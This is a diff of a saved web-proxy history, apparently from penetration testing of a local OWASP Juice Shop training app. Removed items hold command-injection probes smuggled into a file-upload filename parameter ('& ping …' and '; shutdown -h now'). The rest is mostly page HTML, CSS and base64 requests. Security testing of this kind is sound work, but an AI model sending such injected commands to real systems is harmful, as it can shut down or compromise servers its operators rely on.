170.9722222222);--theme-text-fade-10:#e3e2e6;--theme-text-fade-20:#e3e2e6;--theme-text-fade-30:#e3e2e6;--theme-text-fade-40:#e3e2e6;--theme-text-fade-50:#e3e2e6;--theme-text-invert-15:rgb(197.15, 196.45, 199.25);--theme-text-invert-30:rgb(167.3, 166.9, 168.5);--theme-background:#1f2022;--theme-background-lighter:rgb(45.5938461538, 47.0646153846, 50.0061538462);--theme-background-light:rgb(55.3230769231, 57.1076923077, 60.6769230769);--theme-background-darker:rgb(16.4061538462, 16.9353846154, 17.9938461538);--theme-background-dark:rgb(6.6769230769, 6.8923076923, 7.3230769231);--theme-background-darkest:hsl(220, 4.6153846154%, -1.2549019608%);--theme-thumbnail-border:1px solid #abc7ff;--mdc-filled-text-field-container-color:#0000;--mdc-filled-text-field-disabled-container-color:#0000;--theme-background:#3e3e3e;--theme-background-lighter:#4a4a4a;--theme-background-light:#5a5a5a;--theme-background-darker:#333638;--theme-background-dark:#303030;--theme-background-darkest:#2b2b2b;--theme-text:#e8ecef;--theme-text-lighter:#f2f5f7;--theme-text-light:#fff;--theme-text-darker:#b8c0c7;--theme-text-dark:#7f8a93;--mat-sys-surface:#333638;--mat-sys-on-surface:#e8ecef;--mat-sys-surface-container:#3e3e3e;--mat-sys-surface-container-high:#404244;--mat-sys-on-surface-variant:#b8c0c7;--mat-sys-outline:#5a5a5a;--mat-sys-outline-variant:#404244}.bluegrey-lightgreen-theme{--theme-warn:#f44336;--theme-warn-lighter:rgb(245.5877358491, 94.1358490566, 83.0122641509);--theme-warn-light:rgb(246.6462264151, 112.2264150943, 102.3537735849);--theme-warn-darker:rgb(242.4122641509, 39.8641509434, 24.9877358491);--theme-warn-dark:rgb(234.1839622642, 27.9622641509, 12.8160377358);--theme-warn-fade-10:#f44336;--theme-warn-fade-20:#f44336;--theme-warn-fade-30:#f44336;--theme-warn-fade-40:#f44336;--theme-warn-fade-50:#f44336;--mat-sys-error:#f44336;--mat-sys-on-error:#fff}@media screen and (-webkit-min-device-pixel-ratio:0){}</style><link rel="stylesheet" href="styles.css" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.css"></noscript></head>
-<body class="bluegrey-lightgreen-theme">
-  <app-root></app-root>
-<link rel="modulepreload" href="chunk-KD3CNUZG.js"><link rel="modulepreload" href="chunk-PX7UKXVL.js"><link rel="modulepreload" href="chunk-Y3BEW76R.js"><link rel="modulepreload" href="chunk-R7LX7FKI.js"><link rel="modulepreload" href="chunk-7U6P4YGV.js"><link rel="modulepreload" href="chunk-UNFVUBM2.js"><link rel="modulepreload" href="chunk-KI34UYIE.js"><link rel="modulepreload" href="chunk-B3RFAYKZ.js"><link rel="modulepreload" href="chunk-EMJTEAHL.js"><link rel="modulepreload" href="chunk-6RWMKLEX.js"><script src="polyfills.js" type="module"></script><script src="scripts.js" defer></script><script src="main.js" type="module"></script></body>
-</html>
-]]></response>
+    <request base64="true"><![CDATA[R0VUIC9hcGkvUXVhbnRpdHlzLyBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0OjkwMDANCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKg0Kc2VjLWNoLXVhOiAiTm90O0E9QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjE1MCINClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNTAuMC4wLjAgU2FmYXJpLzUzNy4zNg0Kc2VjLWNoLXVhLW1vYmlsZTogPzANClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLU1vZGU6IGNvcnMNClNlYy1GZXRjaC1EZXN0OiBlbXB0eQ0KUmVmZXJlcjogaHR0cDovL2xvY2FsaG9zdDo5MDAwLw0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQ29va2llOiB3ZWxjb21lYmFubmVyX3N0YXR1cz1kaXNtaXNzOyBjb29raWVjb25zZW50X3N0YXR1cz1kaXNtaXNzOyBjb250aW51ZUNvZGU9Njdnd3JKV1o3bGVSRW9EeU5iNDFPVnBROEdtdlNqamhuejB2elhLM3hqcTY1TWtMQm5hOTJtWVBnanI5OyBsYW5ndWFnZT1lbg0KSWYtTm9uZS1NYXRjaDogVy8iMWRjYy1DWW9BUElBZVdwT2pXZTlTT0IwUzhiYzNVODgiDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
+    <status>304</status>
+    <responselength>306</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyIxZGNjLUNZb0FQSUFlV3BPaldlOVNPQjBTOGJjM1U4OCINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDA6MTggR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0K]]></response>
     <comment></comment>
   </item>
   <item>
-    <time>Fri Jul 10 00:01:56 IST 2026</time>
-    <url><![CDATA[http://localhost:3000/file-upload?filename=%26%20ping%20-c%201%20127.0.0.1%20%26]]></url>
+    <time>Thu Sep 03 23:30:17 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/assets/i18n/en.json]]></url>
     <host ip="127.0.0.1">localhost</host>
-    <port>3000</port>
+    <port>9000</port>
     <protocol>http</protocol>
     <method><![CDATA[GET]]></method>
-    <path><![CDATA[/file-upload?filename=%26%20ping%20-c%201%20127.0.0.1%20%26]]></path>
-    <extension>null</extension>
-    <request base64="false"><![CDATA[GET /file-upload?filename=%26%20ping%20-c%201%20127.0.0.1%20%26 HTTP/1.1
-Host: localhost:3000
-sec-ch-ua-platform: "Windows"
-Accept-Language: en-US,en;q=0.9
-sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
-sec-ch-ua-mobile: ?0
-Accept: */*
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: http://localhost:3000/
-Accept-Encoding: gzip, deflate, br
-Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
-Connection: keep-alive
-
-]]></request>
-    <status>200</status>
-    <responselength>10370</responselength>
-    <mimetype>HTML</mimetype>
-    <response base64="false"><![CDATA[HTTP/1.1 200 OK
-Access-Control-Allow-Origin: *
-X-Content-Type-Options: nosniff
-X-Frame-Options: SAMEORIGIN
-Feature-Policy: payment 'self'
-X-Recruiting: /#/jobs
-Accept-Ranges: bytes
-Cache-Control: public, max-age=0
-Last-Modified: Thu, 09 Jul 2026 15:29:00 GMT
-ETag: W/"26af-19f477f1b77"
-Content-Type: text/html; charset=UTF-8
-Vary: Accept-Encoding
-Date: Thu, 09 Jul 2026 18:31:56 GMT
-Connection: keep-alive
-Keep-Alive: timeout=5
-Content-Length: 9903
-
-<!--
-  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
-  ~ SPDX-License-Identifier: MIT
-  -->
-
-<!doctype html>
-<html lang="en" data-beasties-container>
-<head>
-  <meta charset="utf-8">
-  <title>OWASP Juice Shop</title>
-  <meta name="description" content="Probably the most modern and sophisticated insecure web application">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>
-  <link id="favicon" rel="icon" type="image/x-icon" href="assets/public/favicon_js.ico">
-  <script>
-    window.addEventListener("load", function(){
-      window.cookieconsent.initialise({
-        "palette": {
-          "popup": { "background": "var(--theme-primary)", "text": "var(--theme-text)" },
-          "button": { "background": "var(--theme-accent)", "text": "var(--theme-text)" }
-        },
-        "theme": "classic",
-        "position": "bottom-right",
-        "content": { "message": "This website uses fruit cookies to ensure you get the juiciest tracking experience.", "dismiss": "Me want it!", "link": "But me wait!", "href": "https://www.youtube.com/watch?v=9PnbKL3wuH4" }
-      })});
-  </script>
-<style>.bluegrey-lightgreen-theme{--mat-sys-background:#121316;--mat-sys-error:#ffb4ab;--mat-sys-error-container:#93000a;--mat-sys-inverse-on-surface:#2f3033;--mat-sys-inverse-primary:#005cbb;--mat-sys-inverse-surface:#e3e2e6;--mat-sys-on-background:#e3e2e6;--mat-sys-on-error:#690005;--mat-sys-on-error-container:#ffdad6;--mat-sys-on-primary:#002f65;--mat-sys-on-primary-container:#d7e3ff;--mat-sys-on-primary-fixed:#001b3f;--mat-sys-on-primary-fixed-variant:#00458f;--mat-sys-on-secondary:#283041;--mat-sys-on-secondary-container:#dae2f9;--mat-sys-on-secondary-fixed:#131c2b;--mat-sys-on-secondary-fixed-variant:#3e4759;--mat-sys-on-surface:#e3e2e6;--mat-sys-on-surface-variant:#e0e2ec;--mat-sys-on-tertiary:#173800;--mat-sys-on-tertiary-container:#82ff10;--mat-sys-on-tertiary-fixed:#0b2000;--mat-sys-on-tertiary-fixed-variant:#245100;--mat-sys-outline:#8e9099;--mat-sys-outline-variant:#44474e;--mat-sys-primary:#abc7ff;--mat-sys-primary-container:#00458f;--mat-sys-primary-fixed:#d7e3ff;--mat-sys-primary-fixed-dim:#abc7ff;--mat-sys-scrim:#000000;--mat-sys-secondary:#bec6dc;--mat-sys-secondary-container:#3e4759;--mat-sys-secondary-fixed:#dae2f9;--mat-sys-secondary-fixed-dim:#bec6dc;--mat-sys-shadow:#000000;--mat-sys-surface:#121316;--mat-sys-surface-bright:#38393c;--mat-sys-surface-container:#1f2022;--mat-sys-surface-container-high:#292a2c;--mat-sys-surface-container-highest:#343537;--mat-sys-surface-container-low:#1a1b1f;--mat-sys-surface-container-lowest:#0d0e11;--mat-sys-surface-dim:#121316;--mat-sys-surface-tint:#abc7ff;--mat-sys-surface-variant:#44474e;--mat-sys-tertiary:#70e000;--mat-sys-tertiary-container:#245100;--mat-sys-tertiary-fixed:#82ff10;--mat-sys-tertiary-fixed-dim:#70e000;--mat-sys-neutral-variant20:#2d3038;--mat-sys-neutral10:#1a1b1f;--mat-sys-level0:0px 0px 0px 0px rgba(0, 0, 0, .2), 0px 0px 0px 0px rgba(0, 0, 0, .14), 0px 0px 0px 0px rgba(0, 0, 0, .12);--mat-sys-level1:0px 2px 1px -1px rgba(0, 0, 0, .2), 0px 1px 1px 0px rgba(0, 0, 0, .14), 0px 1px 3px 0px rgba(0, 0, 0, .12);--mat-sys-level2:0px 3px 3px -2px rgba(0, 0, 0, .2), 0px 3px 4px 0px rgba(0, 0, 0, .14), 0px 1px 8px 0px rgba(0, 0, 0, .12);--mat-sys-level3:0px 3px 5px -1px rgba(0, 0, 0, .2), 0px 6px 10px 0px rgba(0, 0, 0, .14), 0px 1px 18px 0px rgba(0, 0, 0, .12);--mat-sys-level4:0px 5px 5px -3px rgba(0, 0, 0, .2), 0px 8px 10px 1px rgba(0, 0, 0, .14), 0px 3px 14px 2px rgba(0, 0, 0, .12);--mat-sys-level5:0px 7px 8px -4px rgba(0, 0, 0, .2), 0px 12px 17px 2px rgba(0, 0, 0, .14), 0px 5px 22px 4px rgba(0, 0, 0, .12);--mat-sys-corner-extra-large:28px;--mat-sys-corner-extra-large-top:28px 28px 0 0;--mat-sys-corner-extra-small:4px;--mat-sys-corner-extra-small-top:4px 4px 0 0;--mat-sys-corner-full:9999px;--mat-sys-corner-large:16px;--mat-sys-corner-large-end:0 16px 16px 0;--mat-sys-corner-large-start:16px 0 0 16px;--mat-sys-corner-large-top:16px 16px 0 0;--mat-sys-corner-medium:12px;--mat-sys-corner-none:0;--mat-sys-corner-small:8px;--mat-sys-dragged-state-layer-opacity:.16;--mat-sys-focus-state-layer-opacity:.12;--mat-sys-hover-state-layer-opacity:.08;--mat-sys-pressed-state-layer-opacity:.12;color:var(--mat-sys-on-surface);background-color:var(--mat-sys-surface)}html{font-family:var(--mat-sys-body-medium-font, Roboto, "Helvetica Neue", sans-serif)}.bluegrey-lightgreen-theme{--theme-primary:#438fff;--theme-primary-lighter:rgb(97.6, 161.229787234, 255);--theme-primary-light:rgb(118, 173.3829787234, 255);--theme-primary-darker:rgb(36.4, 124.770212766, 255);--theme-primary-dark:rgb(16, 112.6170212766, 255);--theme-primary-fade-10:#438fff;--theme-primary-fade-20:#438fff;--theme-primary-fade-30:#438fff;--theme-primary-fade-40:#438fff;--theme-primary-fade-50:#438fff;--theme-accent:#50a400;--theme-accent-lighter:rgb(94.9268292683, 194.6, 0);--theme-accent-light:rgb(104.8780487805, 215, 0);--theme-accent-darker:rgb(65.0731707317, 133.4, 0);--theme-accent-dark:rgb(55.1219512195, 113, 0);--theme-accent-fade-10:#50a400;--theme-accent-fade-20:#50a400;--theme-accent-fade-30:#50a400;--theme-accent-fade-40:#50a400;--theme-accent-fade-50:#50a400;--theme-warn:#ffb4ab;--theme-warn-lighter:rgb(255, 207.3214285714, 201.6);--theme-warn-light:rgb(255, 225.5357142857, 222);--theme-warn-darker:rgb(255, 152.6785714286, 140.4);--theme-warn-dark:rgb(255, 134.4642857143, 120);--theme-warn-fade-10:#ffb4ab;--theme-warn-fade-20:#ffb4ab;--theme-warn-fade-30:#ffb4ab;--theme-warn-fade-40:#ffb4ab;--theme-warn-fade-50:#ffb4ab;--theme-text:#e3e2e6;--theme-text-lighter:rgb(242.8666666667, 242.4333333333, 244.1666666667);--theme-text-light:rgb(253.4444444444, 253.3888888889, 253.6111111111);--theme-text-darker:rgb(200.5555555556, 198.6111111111, 206.3888888889);--theme-text-dark:rgb(160.8888888889, 157.5277777778, 170.9722222222);--theme-text-fade-10:#e3e2e6;--theme-text-fade-20:#e3e2e6;--theme-text-fade-30:#e3e2e6;--theme-text-fade-40:#e3e2e6;--theme-text-fade-50:#e3e2e6;--theme-text-invert-15:rgb(197.15, 196.45, 199.25);--theme-text-invert-30:rgb(167.3, 166.9, 168.5);--theme-background:#1f2022;--theme-background-lighter:rgb(45.5938461538, 47.0646153846, 50.0061538462);--theme-background-light:rgb(55.3230769231, 57.1076923077, 60.6769230769);--theme-background-darker:rgb(16.4061538462, 16.9353846154, 17.9938461538);--theme-background-dark:rgb(6.6769230769, 6.8923076923, 7.3230769231);--theme-background-darkest:hsl(220, 4.6153846154%, -1.2549019608%);--theme-thumbnail-border:1px solid #abc7ff;--mdc-filled-text-field-container-color:#0000;--mdc-filled-text-field-disabled-container-color:#0000;--theme-background:#3e3e3e;--theme-background-lighter:#4a4a4a;--theme-background-light:#5a5a5a;--theme-background-darker:#333638;--theme-background-dark:#303030;--theme-background-darkest:#2b2b2b;--theme-text:#e8ecef;--theme-text-lighter:#f2f5f7;--theme-text-light:#fff;--theme-text-darker:#b8c0c7;--theme-text-dark:#7f8a93;--mat-sys-surface:#333638;--mat-sys-on-surface:#e8ecef;--mat-sys-surface-container:#3e3e3e;--mat-sys-surface-container-high:#404244;--mat-sys-on-surface-variant:#b8c0c7;--mat-sys-outline:#5a5a5a;--mat-sys-outline-variant:#404244}.bluegrey-lightgreen-theme{--theme-warn:#f44336;--theme-warn-lighter:rgb(245.5877358491, 94.1358490566, 83.0122641509);--theme-warn-light:rgb(246.6462264151, 112.2264150943, 102.3537735849);--theme-warn-darker:rgb(242.4122641509, 39.8641509434, 24.9877358491);--theme-warn-dark:rgb(234.1839622642, 27.9622641509, 12.8160377358);--theme-warn-fade-10:#f44336;--theme-warn-fade-20:#f44336;--theme-warn-fade-30:#f44336;--theme-warn-fade-40:#f44336;--theme-warn-fade-50:#f44336;--mat-sys-error:#f44336;--mat-sys-on-error:#fff}@media screen and (-webkit-min-device-pixel-ratio:0){}</style><link rel="stylesheet" href="styles.css" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.css"></noscript></head>
-<body class="bluegrey-lightgreen-theme">
-  <app-root></app-root>
-<link rel="modulepreload" href="chunk-KD3CNUZG.js"><link rel="modulepreload" href="chunk-PX7UKXVL.js"><link rel="modulepreload" href="chunk-Y3BEW76R.js"><link rel="modulepreload" href="chunk-R7LX7FKI.js"><link rel="modulepreload" href="chunk-7U6P4YGV.js"><link rel="modulepreload" href="chunk-UNFVUBM2.js"><link rel="modulepreload" href="chunk-KI34UYIE.js"><link rel="modulepreload" href="chunk-B3RFAYKZ.js"><link rel="modulepreload" href="chunk-EMJTEAHL.js"><link rel="modulepreload" href="chunk-6RWMKLEX.js"><script src="polyfills.js" type="module"></script><script src="scripts.js" defer></script><script src="main.js" type="module"></script></body>
-</html>
-]]></response>
+    <path><![CDATA[/assets/i18n/en.json]]></path>
+    <extension>json</extension>
+    <request base64="true"><![CDATA[R0VUIC9hc3NldHMvaTE4bi9lbi5qc29uIEhUVFAvMS4xDQpIb3N0OiBsb2NhbGhvc3Q6OTAwMA0Kc2VjLWNoLXVhLXBsYXRmb3JtOiAiV2luZG93cyINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qDQpzZWMtY2gtdWE6ICJOb3Q7QT1CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTUwIg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE1MC4wLjAuMCBTYWZhcmkvNTM3LjM2DQpzZWMtY2gtdWEtbW9iaWxlOiA/MA0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogY29ycw0KU2VjLUZldGNoLURlc3Q6IGVtcHR5DQpSZWZlcmVyOiBodHRwOi8vbG9jYWxob3N0OjkwMDAvDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb29raWU6IHdlbGNvbWViYW5uZXJfc3RhdHVzPWRpc21pc3M7IGNvb2tpZWNvbnNlbnRfc3RhdHVzPWRpc21pc3M7IGNvbnRpbnVlQ29kZT02N2d3ckpXWjdsZVJFb0R5TmI0MU9WcFE4R212U2pqaG56MHZ6WEszeGpxNjVNa0xCbmE5Mm1ZUGdqcjk7IGxhbmd1YWdlPWVuDQpJZi1Ob25lLU1hdGNoOiBXLyI4YTg5LTE5ZmVmNDQ1YTMwIg0KSWYtTW9kaWZpZWQtU2luY2U6IFR1ZSwgMTEgQXVnIDIwMjYgMDU6MjE6MDIgR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
+    <status>304</status>
+    <responselength>392</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpBY2NlcHQtUmFuZ2VzOiBieXRlcw0KQ2FjaGUtQ29udHJvbDogcHVibGljLCBtYXgtYWdlPTANCkxhc3QtTW9kaWZpZWQ6IFR1ZSwgMTEgQXVnIDIwMjYgMDU6MjE6MDIgR01UDQpFVGFnOiBXLyI4YTg5LTE5ZmVmNDQ1YTMwIg0KRGF0ZTogVGh1LCAwMyBTZXAgMjAyNiAxODowMDoxNyBHTVQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCktlZXAtQWxpdmU6IHRpbWVvdXQ9NQ0KDQo=]]></response>
     <comment></comment>
   </item>
   <item>
-    <time>Fri Jul 10 00:01:57 IST 2026</time>
-    <url><![CDATA[http://localhost:3000/file-upload?filename=file.txt%3B%20shutdown%20-h%20now]]></url>
+    <time>Thu Sep 03 23:30:17 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/admin/application-configuration]]></url>
     <host ip="127.0.0.1">localhost</host>
-    <port>3000</port>
+    <port>9000</port>
     <protocol>http</protocol>
     <method><![CDATA[GET]]></method>
-    <path><![CDATA[/file-upload?filename=file.txt%3B%20shutdown%20-h%20now]]></path>
+    <path><![CDATA[/rest/admin/application-configuration]]></path>
     <extension>null</extension>
-    <request base64="false"><![CDATA[GET /file-upload?filename=file.txt%3B%20shutdown%20-h%20now HTTP/1.1
-Host: localhost:3000
-sec-ch-ua-platform: "Windows"
-Accept-Language: en-US,en;q=0.9
-sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
-sec-ch-ua-mobile: ?0
-Accept: */*
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: http://localhost:3000/
-Accept-Encoding: gzip, deflate, br
-Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
-Connection: keep-alive
-
-]]></request>
-    <status>200</status>
-    <responselength>10370</responselength>
-    <mimetype>HTML</mimetype>
-    <response base64="false"><![CDATA[HTTP/1.1 200 OK
-Access-Control-Allow-Origin: *
-X-Content-Type-Options: nosniff
-X-Frame-Options: SAMEORIGIN
-Feature-Policy: payment 'self'
-X-Recruiting: /#/jobs
-Accept-Ranges: bytes
-Cache-Control: public, max-age=0
-Last-Modified: Thu, 09 Jul 2026 15:29:00 GMT
-ETag: W/"26af-19f477f1b77"
-Content-Type: text/html; charset=UTF-8
-Vary: Accept-Encoding
-Date: Thu, 09 Jul 2026 18:31:57 GMT
-Connection: keep-alive
-Keep-Alive: timeout=5
-Content-Length: 9903
-
-<!--
-  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
-  ~ SPDX-License-Identifier: MIT
-  -->
-
-<!doctype html>
-<html lang="en" data-beasties-container>
-<head>
-  <meta charset="utf-8">
-  <title>OWASP Juice Shop</title>
-  <meta name="description" content="Probably the most modern and sophisticated insecure web application">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>
-  <link id="favicon" rel="icon" type="image/x-icon" href="assets/public/favicon_js.ico">
-  <script>
-    window.addEventListener("load", function(){
-      window.cookieconsent.initialise({
-        "palette": {
-          "popup": { "background": "var(--theme-primary)", "text": "var(--theme-text)" },
-          "button": { "background": "var(--theme-accent)", "text": "var(--theme-text)" }
-        },
-        "theme": "classic",
-        "position": "bottom-right",
-        "content": { "message": "This website uses fruit cookies to ensure you get the juiciest tracking experience.", "dismiss": "Me want it!", "link": "But me wait!", "href": "https://www.youtube.com/watch?v=9PnbKL3wuH4" }
-      })});
-  </script>
-<style>.bluegrey-lightgreen-theme{--mat-sys-background:#121316;--mat-sys-error:#ffb4ab;--mat-sys-error-container:#93000a;--mat-sys-inverse-on-surface:#2f3033;--mat-sys-inverse-primary:#005cbb;--mat-sys-inverse-surface:#e3e2e6;--mat-sys-on-background:#e3e2e6;--mat-sys-on-error:#690005;--mat-sys-on-error-container:#ffdad6;--mat-sys-on-primary:#002f65;--mat-sys-on-primary-container:#d7e3ff;--mat-sys-on-primary-fixed:#001b3f;--mat-sys-on-primary-fixed-variant:#00458f;--mat-sys-on-secondary:#283041;--mat-sys-on-secondary-container:#dae2f9;--mat-sys-on-secondary-fixed:#131c2b;--mat-sys-on-secondary-fixed-variant:#3e4759;--mat-sys-on-surface:#e3e2e6;--mat-sys-on-surface-variant:#e0e2ec;--mat-sys-on-tertiary:#173800;--mat-sys-on-tertiary-container:#82ff10;--mat-sys-on-tertiary-fixed:#0b2000;--mat-sys-on-tertiary-fixed-variant:#245100;--mat-sys-outline:#8e9099;--mat-sys-outline-variant:#44474e;--mat-sys-primary:#abc7ff;--mat-sys-primary-container:#00458f;--mat-sys-primary-fixed:#d7e3ff;--mat-sys-primary-fixed-dim:#abc7ff;--mat-sys-scrim:#000000;--mat-sys-secondary:#bec6dc;--mat-sys-secondary-container:#3e4759;--mat-sys-secondary-fixed:#dae2f9;--mat-sys-secondary-fixed-dim:#bec6dc;--mat-sys-shadow:#000000;--mat-sys-surface:#121316;--mat-sys-surface-bright:#38393c;--mat-sys-surface-container:#1f2022;--mat-sys-surface-container-high:#292a2c;--mat-sys-surface-container-highest:#343537;--mat-sys-surface-container-low:#1a1b1f;--mat-sys-surface-container-lowest:#0d0e11;--mat-sys-surface-dim:#121316;--mat-sys-surface-tint:#abc7ff;--mat-sys-surface-variant:#44474e;--mat-sys-tertiary:#70e000;--mat-sys-tertiary-container:#245100;--mat-sys-tertiary-fixed:#82ff10;--mat-sys-tertiary-fixed-dim:#70e000;--mat-sys-neutral-variant20:#2d3038;--mat-sys-neutral10:#1a1b1f;--mat-sys-level0:0px 0px 0px 0px rgba(0, 0, 0, .2), 0px 0px 0px 0px rgba(0, 0, 0, .14), 0px 0px 0px 0px rgba(0, 0, 0, .12);--mat-sys-level1:0px 2px 1px -1px rgba(0, 0, 0, .2), 0px 1px 1px 0px rgba(0, 0, 0, .14), 0px 1px 3px 0px rgba(0, 0, 0, .12);--mat-sys-level2:0px 3px 3px -2px rgba(0, 0, 0, .2), 0px 3px 4px 0px rgba(0, 0, 0, .14), 0px 1px 8px 0px rgba(0, 0, 0, .12);--mat-sys-level3:0px 3px 5px -1px rgba(0, 0, 0, .2), 0px 6px 10px 0px rgba(0, 0, 0, .14), 0px 1px 18px 0px rgba(0, 0, 0, .12);--mat-sys-level4:0px 5px 5px -3px rgba(0, 0, 0, .2), 0px 8px 10px 1px rgba(0, 0, 0, .14), 0px 3px 14px 2px rgba(0, 0, 0, .12);--mat-sys-level5:0px 7px 8px -4px rgba(0, 